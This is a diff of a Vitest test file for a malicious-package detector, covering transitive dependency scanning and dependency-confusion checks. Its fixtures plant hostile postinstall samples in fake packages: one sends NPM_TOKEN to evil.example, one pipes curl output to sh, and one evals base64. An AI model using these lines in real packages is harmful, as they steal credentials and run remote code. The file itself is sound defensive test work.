@@ -7,7 +7,7 @@
  * referenced script files.
  */
 
-import { describe, it, expect, beforeEach, afterEach } from "vitest";
+import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
@@ -17,8 +17,13 @@ import {
   checkKnownCompromisedPackage,
   inspectInstallScripts,
   scanForMaliciousPatterns,
+  scanTransitiveDependencies,
+  checkDependencyConfusion,
+  isInternalPackageName,
   KNOWN_COMPROMISED_PACKAGES,
   TYPOSQUAT_TARGETS,
+  type TransitivePackage,
+  type RegistryProbeResult,
 } from "./malicious-detector.js";
 
 let tmp: string;
@@ -295,5 +300,214 @@ describe("scanForMaliciousPatterns", () => {
       expect(typeof f.confidence).toBe("number");
       expect(f.timestamp).toBeGreaterThan(0);
     }
+  });
+
+  it("attributes findings as direct by default", () => {
+    const dir = fakePackage("loadsh");
+    const findings = scanForMaliciousPatterns({
+      packageName: "loadsh",
+      packagePath: dir,
+      packageVersion: "1.2.3",
+    });
+    expect(findings.length).toBeGreaterThan(0);
+    for (const f of findings) {
+      expect(f.supplyChain?.relation).toBe("direct");
+      expect(f.supplyChain?.package).toBe("loadsh@1.2.3");
+      expect(f.supplyChain?.depth).toBe(0);
+    }
+  });
+});
+
+// ────────────────────────────────────────────────────────────────────
+// scanTransitiveDependencies (issue #565)
+// ────────────────────────────────────────────────────────────────────
+
+/** Build a package dir at an arbitrary subpath under `tmp` (for tree fixtures). */
+function makePackageAt(
+  rel: string,
+  name: string,
+  version: string,
+  opts: { scripts?: Record<string, string>; files?: Record<string, string> } = {},
+): string {
+  const dir = join(tmp, rel);
+  mkdirSync(dir, { recursive: true });
+  writeFileSync(
+    join(dir, "package.json"),
+    JSON.stringify({ name, version, scripts: opts.scripts ?? {} }, null, 2),
+  );
+  for (const [f, content] of Object.entries(opts.files ?? {})) {
+    const abs = join(dir, f);
+    mkdirSync(abs.slice(0, abs.lastIndexOf("/")), { recursive: true });
+    writeFileSync(abs, content);
+  }
+  return dir;
+}
+
+describe("scanTransitiveDependencies", () => {
+  it("source-audits a malicious transitive dep and attributes it (clean root)", () => {
+    const evilDir = makePackageAt("nm/evil-dep", "evil-dep", "9.9.9", {
+      scripts: { postinstall: "node steal.js" },
+      files: { "steal.js": "fetch('http://evil.example/' + process.env.NPM_TOKEN);" },
+    });
+    const cleanDir = makePackageAt("nm/clean-dep", "clean-dep", "1.0.0");
+
+    const packages: TransitivePackage[] = [
+      { name: "evil-dep", version: "9.9.9", path: evilDir, depth: 2, dependencyPath: ["my-app", "clean-dep", "evil-dep"] },
+      { name: "clean-dep", version: "1.0.0", path: cleanDir, depth: 1, dependencyPath: ["my-app", "clean-dep"] },
+    ];
+
+    const result = scanTransitiveDependencies({ rootName: "my-app", packages });
+    expect(result.scanned).toBe(2);
+    const hook = result.findings.find((f) => f.templateId === "malicious-install-hook");
+    expect(hook).toBeDefined();
+    expect(hook?.supplyChain?.relation).toBe("transitive");
+    expect(hook?.supplyChain?.package).toBe("evil-dep@9.9.9");
+    expect(hook?.title).toContain("[transitive]");
+    expect(hook?.description).toContain("evil-dep@9.9.9");
+    expect(hook?.description).toContain("my-app › clean-dep › evil-dep");
+  });
+
+  it("never re-audits the root package", () => {
+    const rootDir = makePackageAt("nm/my-app", "my-app", "1.0.0", {
+      scripts: { postinstall: "node x.js" },
+      files: { "x.js": "eval(atob('Zm9v'));" },
+    });
+    const packages: TransitivePackage[] = [
+      { name: "my-app", version: "1.0.0", path: rootDir, depth: 1 },
+    ];
+    const result = scanTransitiveDependencies({ rootName: "my-app", packages });
+    expect(result.scanned).toBe(0);
+    expect(result.findings).toHaveLength(0);
+  });
+
+  it("dedupes by name@version (diamond dependency audited once)", () => {
+    const a = makePackageAt("nm/a/dup", "dup", "1.0.0", {
+      scripts: { postinstall: "node p.js" },
+      files: { "p.js": "child_process.exec('curl http://x|sh');" },
+    });
+    const b = makePackageAt("nm/b/dup", "dup", "1.0.0", {
+      scripts: { postinstall: "node p.js" },
+      files: { "p.js": "child_process.exec('curl http://x|sh');" },
+    });
+    const packages: TransitivePackage[] = [
+      { name: "dup", version: "1.0.0", path: a, depth: 1 },
+      { name: "dup", version: "1.0.0", path: b, depth: 2 },
+    ];
+    const result = scanTransitiveDependencies({ rootName: "root", packages });
+    expect(result.scanned).toBe(1);
+  });
+
+  it("is budget-bounded and reports skipped packages", () => {
+    const packages: TransitivePackage[] = [];
+    for (let i = 0; i < 5; i++) {
+      const dir = makePackageAt(`nm/loadsh${i}`, "loadsh", `${i}.0.0`);
+      packages.push({ name: "loadsh", version: `${i}.0.0`, path: dir, depth: 1 });
+    }
+    const result = scanTransitiveDependencies({ rootName: "root", packages, maxPackages: 2 });
+    expect(result.scanned).toBe(2);
+    expect(result.skipped).toBe(3);
+  });
+
+  it("returns nothing when budget is 0", () => {
+    const dir = makePackageAt("nm/loadsh", "loadsh", "1.0.0");
+    const result = scanTransitiveDependencies({
+      rootName: "root",
+      packages: [{ name: "loadsh", version: "1.0.0", path: dir, depth: 1 }],
+      maxPackages: 0,
+    });
+    expect(result.scanned).toBe(0);
+    expect(result.findings).toHaveLength(0);
+  });
+});
+
+// ────────────────────────────────────────────────────────────────────
+// Dependency-confusion (issue #565)
+// ────────────────────────────────────────────────────────────────────
+
+describe("isInternalPackageName", () => {
+  it("matches a scoped name against an internal scope", () => {
+    expect(isInternalPackageName("@acme/widgets", ["@acme"], [])).toBe(true);
+    expect(isInternalPackageName("@acme/widgets", ["@acme/"], [])).toBe(true);
+  });
+  it("does not match a different scope", () => {
+    expect(isInternalPackageName("@other/widgets", ["@acme"], [])).toBe(false);
+    // @acme prefix must be scope-delimited, not a substring of another scope
+    expect(isInternalPackageName("@acme-corp/widgets", ["@acme"], [])).toBe(false);
+  });
+  it("matches an exact unscoped internal name (case-insensitive)", () => {
+    expect(isInternalPackageName("acme-internal", [], ["acme-internal"])).toBe(true);
+    expect(isInternalPackageName("ACME-Internal", [], ["acme-internal"])).toBe(true);
+  });
+  it("returns false with no config", () => {
+    expect(isInternalPackageName("@acme/widgets")).toBe(false);
+  });
+});
+
+describe("checkDependencyConfusion", () => {
+  const exists = (over: Partial<RegistryProbeResult> = {}): RegistryProbeResult => ({
+    exists: true,
+    latestVersion: "3.0.0",
+    ...over,
+  });
+
+  it("flags an internal scoped name that also exists publicly", async () => {
+    const finding = await checkDependencyConfusion({
+      packageName: "@acme/widgets",
+      version: "1.0.0",
+      internalScopes: ["@acme"],
+      probe: async () => exists(),
+    });
+    expect(finding).not.toBeNull();
+    expect(finding?.templateId).toBe("malicious-dependency-confusion");
+    expect(finding?.category).toBe("supply-chain");
+    expect(finding?.severity).toBe("high");
+    expect(finding?.description).toContain("public latest: 3.0.0");
+  });
+
+  it("does not flag an internal name that is NOT on the public registry", async () => {
+    const finding = await checkDependencyConfusion({
+      packageName: "@acme/widgets",
+      version: "1.0.0",
+      internalScopes: ["@acme"],
+      probe: async () => ({ exists: false }),
+    });
+    expect(finding).toBeNull();
+  });
+
+  it("does not flag a public package that is not declared internal", async () => {
+    const probe = vi.fn(async () => exists());
+    const finding = await checkDependencyConfusion({
+      packageName: "lodash",
+      version: "1.0.0",
+      internalScopes: ["@acme"],
+      probe,
+    });
+    expect(finding).toBeNull();
+    // Allow-list filter runs first — no network probe for non-internal names.
+    expect(probe).not.toHaveBeenCalled();
+  });
+
+  it("escalates to critical on a maintainer mismatch", async () => {
+    const finding = await checkDependencyConfusion({
+      packageName: "@acme/widgets",
+      version: "1.0.0",
+      internalScopes: ["@acme"],
+      internalMaintainers: ["acme-bot"],
+      probe: async () => exists({ maintainers: ["totally-not-acme"] }),
+    });
+    expect(finding?.severity).toBe("critical");
+    expect(finding?.description).toContain("Maintainer mismatch");
+  });
+
+  it("fails soft (returns null) when the probe throws", async () => {
+    const finding = await checkDependencyConfusion({
+      packageName: "@acme/widgets",
+      version: "1.0.0",
+      internalScopes: ["@acme"],
+      probe: async () => {
+        throw new Error("network down");
+      },
+    });
+    expect(finding).toBeNull();
   });
 });
